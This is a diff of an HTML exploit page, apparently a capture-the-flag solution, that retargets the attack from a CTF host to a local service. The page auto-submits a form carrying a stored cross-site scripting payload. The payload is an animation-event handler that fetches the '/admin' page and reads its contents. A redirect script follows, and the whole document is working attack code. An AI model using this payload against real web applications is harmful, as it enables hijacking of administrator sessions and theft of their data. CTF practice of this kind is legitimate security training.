@@ -1,7 +1,7 @@
 <!doctype html>
 <html>
 <body>
-<form id="f" action="https://web-817be04e2756108d.ctf.hackable.site/notes" method="POST">
+<form id="f" action="http://web:8080/notes" method="POST">
   <textarea name="body"><style>@keyframes x{}</style>
 <xss style="animation-name:x" onanimationstart="async function a(){
   let r=await(await fetch('/admin')).text();
@@ -13,7 +13,7 @@
 
 <script>
   f.submit();
-  setTimeout(() => location.href = "https://web-817be04e2756108d.ctf.hackable.site/", 300);
+  setTimeout(() => location.href = "http://web:8080/", 300);
 </script>
 </body>
 </html>
